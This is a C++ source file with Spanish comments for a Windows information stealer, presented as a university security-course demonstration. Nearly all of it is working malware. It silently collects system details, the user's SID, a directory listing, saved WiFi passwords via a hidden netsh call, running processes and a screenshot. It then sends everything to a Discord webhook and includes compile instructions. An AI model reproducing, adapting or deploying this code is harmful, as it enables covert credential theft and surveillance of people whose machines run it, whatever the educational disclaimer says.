// ============================================================
// EDUCATIONAL PURPOSES ONLY
// Este codigo fue desarrollado como proyecto academico para
// la materia de Seguridad Informatica. Su uso esta restringido
// a entornos controlados con autorizacion explicita.
// No usar contra sistemas sin permiso del propietario.
// ============================================================
// Grupo 4 - Mini Stealer para demostracion
// Compilar en Kali con mingw:
//   sudo apt-get install mingw-w64
//   x86_64-w64-mingw32-g++ stealer.cpp -o stealer.exe \
//     -lwinhttp -lgdi32 -lole32 -loleaut32 \
//     -static -mwindows
// ============================================================

#define UNICODE
#define _UNICODE
#define _WIN32_WINNT 0x0601

#include <windows.h>
#include <winhttp.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <gdiplus.h>
#include <wincred.h>
#include <lm.h>
#include <sstream>
#include <string>
#include <vector>
#include <fstream>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "credui.lib")
#pragma comment(lib, "netapi32.lib")

// ============================================================
// CONFIGURACION - pon aqui tu webhook de Discord
// ============================================================
// Para crear un webhook: Discord -> tu servidor -> canal
// -> Editar canal -> Integraciones -> Webhooks -> Nuevo Webhook
// Copia la URL y pegala aqui abajo (solo la parte del host y path)
const std::wstring WEBHOOK_HOST = L"discord.com";
const std::wstring WEBHOOK_PATH = L"/api/webhooks/TU_WEBHOOK_ID/TU_WEBHOOK_TOKEN";
// ============================================================

// Convierte std::string a std::wstring
std::wstring ToWide(const std::string& s) {
    if (s.empty()) return L"";
    int sz = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, nullptr, 0);
    std::wstring w(sz, 0);
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, &w[0], sz);
    return w;
}

// Convierte std::wstring a std::string UTF-8
std::string ToNarrow(const std::wstring& w) {
    if (w.empty()) return "";
    int sz = WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, nullptr, 0, nullptr, nullptr);
    std::string s(sz, 0);
    WideCharToMultiByte(CP_UTF8, 0, w.c_str(), -1, &s[0], sz, nullptr, nullptr);
    return s;
}

// Escapa caracteres especiales para que el JSON no se rompa
std::string EscapeJson(const std::string& s) {
    std::string out;
    for (char c : s) {
        if      (c == '"')  out += "\\\"";
        else if (c == '\\') out += "\\\\";
        else if (c == '\n') out += "\\n";
        else if (c == '\r') out += "\\r";
        else if (c == '\t') out += "\\t";
        else                out += c;
    }
    return out;
}

// ============================================================
// MODULO 1 - Informacion del sistema
// ============================================================
std::string GetSysInfo() {
    std::ostringstream ss;

    // Nombre del equipo
    wchar_t compName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD sz = sizeof(compName) / sizeof(wchar_t);
    GetComputerNameW(compName, &sz);

    // Nombre del usuario actual
    wchar_t userName[256];
    sz = 256;
    GetUserNameW(userName, &sz);

    // Version del sistema operativo
    OSVERSIONINFOEXW osvi = { sizeof(osvi) };
    // RtlGetVersion es la forma correcta en Windows 10/11
    typedef NTSTATUS(WINAPI* RtlGetVersionPtr)(OSVERSIONINFOEXW*);
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(ntdll, "RtlGetVersion");
    if (RtlGetVersion) RtlGetVersion(&osvi);

    // Arquitectura del procesador
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    std::string arch = (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) ? "x64" : "x86";

    // RAM total
    MEMORYSTATUSEX mem = { sizeof(mem) };
    GlobalMemoryStatusEx(&mem);
    DWORD ramGB = (DWORD)(mem.ullTotalPhys / (1024 * 1024 * 1024));

    ss << "**INFORMACION DEL SISTEMA**\n";
    ss << "```\n";
    ss << "Hostname   : " << ToNarrow(compName) << "\n";
    ss << "Usuario    : " << ToNarrow(userName) << "\n";
    ss << "SO         : Windows " << osvi.dwMajorVersion << "." << osvi.dwMinorVersion
       << " (Build " << osvi.dwBuildNumber << ")\n";
    ss << "Arch       : " << arch << "\n";
    ss << "RAM total  : " << ramGB << " GB\n";
    ss << "```\n";

    return ss.str();
}

// ============================================================
// MODULO 2 - SID del usuario actual
// ============================================================
std::string GetUserSID() {
    std::ostringstream ss;

    HANDLE token = nullptr;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token))
        return "No se pudo obtener el SID.\n";

    DWORD len = 0;
    GetTokenInformation(token, TokenUser, nullptr, 0, &len);
    std::vector<BYTE> buf(len);
    if (!GetTokenInformation(token, TokenUser, buf.data(), len, &len)) {
        CloseHandle(token);
        return "No se pudo leer el token.\n";
    }

    TOKEN_USER* tu = reinterpret_cast<TOKEN_USER*>(buf.data());
    LPWSTR sidStr = nullptr;
    ConvertSidToStringSidW(tu->User.Sid, &sidStr);

    ss << "**SID DEL USUARIO**\n";
    ss << "```\n";
    ss << ToNarrow(sidStr) << "\n";
    ss << "```\n";

    LocalFree(sidStr);
    CloseHandle(token);
    return ss.str();
}

// ============================================================
// MODULO 3 - Directorio actual y listado de archivos
// ============================================================
std::string GetDirectoryListing() {
    std::ostringstream ss;

    wchar_t curDir[MAX_PATH];
    GetCurrentDirectoryW(MAX_PATH, curDir);

    ss << "**DIRECTORIO ACTUAL Y CONTENIDO**\n";
    ss << "```\n";
    ss << "Ruta: " << ToNarrow(curDir) << "\n\n";

    std::wstring pattern = std::wstring(curDir) + L"\\*";
    WIN32_FIND_DATAW fd;
    HANDLE hFind = FindFirstFileW(pattern.c_str(), &fd);

    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            std::string name = ToNarrow(fd.cFileName);
            if (name == "." || name == "..") continue;

            bool isDir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;

            ULARGE_INTEGER fileSize;
            fileSize.LowPart  = fd.nFileSizeLow;
            fileSize.HighPart = fd.nFileSizeHigh;

            SYSTEMTIME st;
            FileTimeToSystemTime(&fd.ftLastWriteTime, &st);

            char line[512];
            if (isDir) {
                snprintf(line, sizeof(line), "[DIR]  %s\n", name.c_str());
            } else {
                snprintf(line, sizeof(line), "[FILE] %-40s  %llu bytes  %02d/%02d/%04d\n",
                         name.c_str(), fileSize.QuadPart,
                         st.wDay, st.wMonth, st.wYear);
            }
            ss << line;
        } while (FindNextFileW(hFind, &fd));
        FindClose(hFind);
    }

    ss << "```\n";
    return ss.str();
}

// ============================================================
// MODULO 4 - Contrasenas de redes WiFi guardadas
// ============================================================
std::string GetWiFiPasswords() {
    std::ostringstream ss;
    ss << "**REDES WIFI GUARDADAS**\n";
    ss << "```\n";

    // Obtenemos la lista de perfiles con netsh y lo parseamos
    // Usamos CreateProcess para capturar la salida
    auto RunCmd = [](const std::wstring& cmd) -> std::string {
        SECURITY_ATTRIBUTES sa = { sizeof(sa), nullptr, TRUE };
        HANDLE hRead, hWrite;
        if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return "";

        STARTUPINFOW si = { sizeof(si) };
        si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.hStdOutput  = hWrite;
        si.hStdError   = hWrite;
        si.wShowWindow = SW_HIDE;

        PROCESS_INFORMATION pi;
        std::wstring cmdCopy = cmd;
        if (!CreateProcessW(nullptr, &cmdCopy[0], nullptr, nullptr,
                            TRUE, CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi)) {
            CloseHandle(hRead); CloseHandle(hWrite);
            return "";
        }

        CloseHandle(hWrite);
        WaitForSingleObject(pi.hProcess, 10000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        std::string output;
        char buf[4096];
        DWORD read;
        while (ReadFile(hRead, buf, sizeof(buf) - 1, &read, nullptr) && read > 0) {
            buf[read] = '\0';
            output += buf;
        }
        CloseHandle(hRead);
        return output;
    };

    // Obtener lista de perfiles
    std::string profiles = RunCmd(L"netsh wlan show profiles");

    // Parsear nombres de perfiles
    std::vector<std::string> names;
    std::istringstream stream(profiles);
    std::string line;
    while (std::getline(stream, line)) {
        // La linea tiene formato: "    Perfil de todos los usuarios : NombreRed"
        size_t pos = line.find(':');
        if (pos != std::string::npos) {
            std::string name = line.substr(pos + 2);
            // Limpiar espacios y saltos de linea
            while (!name.empty() && (name.back() == '\r' || name.back() == '\n' || name.back() == ' '))
                name.pop_back();
            if (!name.empty() && line.find("Perfil") != std::string::npos)
                names.push_back(name);
        }
    }

    if (names.empty()) {
        ss << "No se encontraron perfiles WiFi o no hay adaptador inalambrico.\n";
    } else {
        for (const auto& n : names) {
            std::wstring cmd = L"netsh wlan show profile name=\"" + ToWide(n) + L"\" key=clear";
            std::string detail = RunCmd(cmd);

            std::string pass = "No encontrada";
            std::istringstream ds(detail);
            while (std::getline(ds, line)) {
                // Busca la linea que contiene el contenido de la clave
                if (line.find("Contenido de la clave") != std::string::npos ||
                    line.find("Key Content") != std::string::npos) {
                    size_t p = line.find(':');
                    if (p != std::string::npos) {
                        pass = line.substr(p + 2);
                        while (!pass.empty() && (pass.back() == '\r' || pass.back() == '\n' || pass.back() == ' '))
                            pass.pop_back();
                    }
                }
            }
            ss << "SSID: " << n << "\n";
            ss << "Pass: " << pass << "\n\n";
        }
    }

    ss << "```\n";
    return ss.str();
}

// ============================================================
// MODULO 5 - Procesos corriendo en el sistema
// ============================================================
std::string GetProcessList() {
    std::ostringstream ss;
    ss << "**PROCESOS ACTIVOS (top 20)**\n";
    ss << "```\n";

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return "Error al listar procesos.\n";

    PROCESSENTRY32W pe = { sizeof(pe) };
    int count = 0;
    if (Process32FirstW(snap, &pe)) {
        do {
            if (count++ >= 20) break;
            char line[256];
            snprintf(line, sizeof(line), "[%5lu] %s\n",
                     pe.th32ProcessID, ToNarrow(pe.szExeFile).c_str());
            ss << line;
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    ss << "```\n";
    return ss.str();
}

// ============================================================
// MODULO 6 - Captura de pantalla y conversion a PNG en memoria
// ============================================================
std::vector<BYTE> TakeScreenshot() {
    // Inicializar GDI+
    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);

    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);

    HDC hdcScreen = GetDC(nullptr);
    HDC hdcMem    = CreateCompatibleDC(hdcScreen);
    HBITMAP hBmp  = CreateCompatibleBitmap(hdcScreen, screenW, screenH);
    SelectObject(hdcMem, hBmp);
    BitBlt(hdcMem, 0, 0, screenW, screenH, hdcScreen, 0, 0, SRCCOPY);

    // Guardar en memoria como PNG usando IStream
    IStream* istream = nullptr;
    CreateStreamOnHGlobal(nullptr, TRUE, &istream);

    Gdiplus::Bitmap* bitmap = Gdiplus::Bitmap::FromHBITMAP(hBmp, nullptr);

    // Buscar el encoder de PNG
    UINT numEncoders, size;
    Gdiplus::GetImageEncodersSize(&numEncoders, &size);
    std::vector<BYTE> encoderBuf(size);
    Gdiplus::ImageCodecInfo* pImageCodecInfo = reinterpret_cast<Gdiplus::ImageCodecInfo*>(encoderBuf.data());
    Gdiplus::GetImageEncoders(numEncoders, size, pImageCodecInfo);

    CLSID pngClsid;
    for (UINT j = 0; j < numEncoders; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, L"image/png") == 0) {
            pngClsid = pImageCodecInfo[j].Clsid;
            break;
        }
    }

    bitmap->Save(istream, &pngClsid);

    // Copiar IStream a vector
    HGLOBAL hg = nullptr;
    GetHGlobalFromStream(istream, &hg);
    SIZE_T dataSize = GlobalSize(hg);
    LPVOID pData    = GlobalLock(hg);
    std::vector<BYTE> pngData(static_cast<BYTE*>(pData),
                               static_cast<BYTE*>(pData) + dataSize);
    GlobalUnlock(hg);
    istream->Release();

    delete bitmap;
    DeleteObject(hBmp);
    DeleteDC(hdcMem);
    ReleaseDC(nullptr, hdcScreen);
    Gdiplus::GdiplusShutdown(gdiplusToken);

    return pngData;
}

// ============================================================
// EXFILTRACION - Enviar texto al webhook de Discord
// ============================================================
bool SendToDiscord(const std::string& content) {
    // Discord tiene limite de 2000 chars por mensaje
    // Si el contenido es mas grande, lo cortamos en partes
    const size_t MAX_CHUNK = 1900;

    auto SendChunk = [](const std::string& chunk) -> bool {
        std::string body = "{\"content\": \"" + EscapeJson(chunk) + "\"}";

        HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0",
                                         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                         WINHTTP_NO_PROXY_NAME,
                                         WINHTTP_NO_PROXY_BYPASS, 0);
        if (!hSession) return false;

        HINTERNET hConnect = WinHttpConnect(hSession, WEBHOOK_HOST.c_str(),
                                             INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (!hConnect) { WinHttpCloseHandle(hSession); return false; }

        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST",
                                                 WEBHOOK_PATH.c_str(),
                                                 nullptr, WINHTTP_NO_REFERER,
                                                 WINHTTP_DEFAULT_ACCEPT_TYPES,
                                                 WINHTTP_FLAG_SECURE);
        if (!hRequest) {
            WinHttpCloseHandle(hConnect);
            WinHttpCloseHandle(hSession);
            return false;
        }

        WinHttpAddRequestHeaders(hRequest,
            L"Content-Type: application/json",
            (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);

        BOOL result = WinHttpSendRequest(hRequest,
            WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            (LPVOID)body.c_str(), (DWORD)body.size(),
            (DWORD)body.size(), 0);

        if (result) WinHttpReceiveResponse(hRequest, nullptr);

        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return result == TRUE;
    };

    for (size_t i = 0; i < content.size(); i += MAX_CHUNK) {
        std::string chunk = content.substr(i, MAX_CHUNK);
        if (!SendChunk(chunk)) return false;
        Sleep(500); // pequeña pausa para no saturar el webhook
    }
    return true;
}

// ============================================================
// EXFILTRACION - Enviar screenshot como archivo al webhook
// ============================================================
bool SendScreenshot(const std::vector<BYTE>& pngData) {
    std::string boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";

    // Construir el body multipart
    std::string header =
        "--" + boundary + "\r\n"
        "Content-Disposition: form-data; name=\"file\"; filename=\"screenshot.png\"\r\n"
        "Content-Type: image/png\r\n\r\n";
    std::string footer = "\r\n--" + boundary + "--\r\n";

    std::vector<BYTE> body;
    body.insert(body.end(), header.begin(), header.end());
    body.insert(body.end(), pngData.begin(), pngData.end());
    body.insert(body.end(), footer.begin(), footer.end());

    std::wstring contentType = ToWide("multipart/form-data; boundary=" + boundary);

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0",
                                     WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                     WINHTTP_NO_PROXY_NAME,
                                     WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return false;

    HINTERNET hConnect = WinHttpConnect(hSession, WEBHOOK_HOST.c_str(),
                                         INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST",
                                             WEBHOOK_PATH.c_str(),
                                             nullptr, WINHTTP_NO_REFERER,
                                             WINHTTP_DEFAULT_ACCEPT_TYPES,
                                             WINHTTP_FLAG_SECURE);
    if (!hRequest) {
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    WinHttpAddRequestHeaders(hRequest,
        contentType.c_str(),
        (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE);

    BOOL result = WinHttpSendRequest(hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        body.data(), (DWORD)body.size(),
        (DWORD)body.size(), 0);

    if (result) WinHttpReceiveResponse(hRequest, nullptr);

    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return result == TRUE;
}

// ============================================================
// MAIN - Orquesta todo y exfiltra al webhook
// ============================================================
int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    // Construir el reporte completo
    std::string report = "";
    report += ">>> GRUPO 4 - REPORTE DE ACCESO <<<\n\n";
    report += GetSysInfo();
    report += "\n";
    report += GetUserSID();
    report += "\n";
    report += GetDirectoryListing();
    report += "\n";
    report += GetWiFiPasswords();
    report += "\n";
    report += GetProcessList();

    // Enviar el reporte de texto al webhook
    SendToDiscord(report);

    // Enviar la captura de pantalla
    std::vector<BYTE> png = TakeScreenshot();
    if (!png.empty()) {
        Sleep(1000); // espera un momento entre mensajes
        SendScreenshot(png);
    }

    return 0;
}
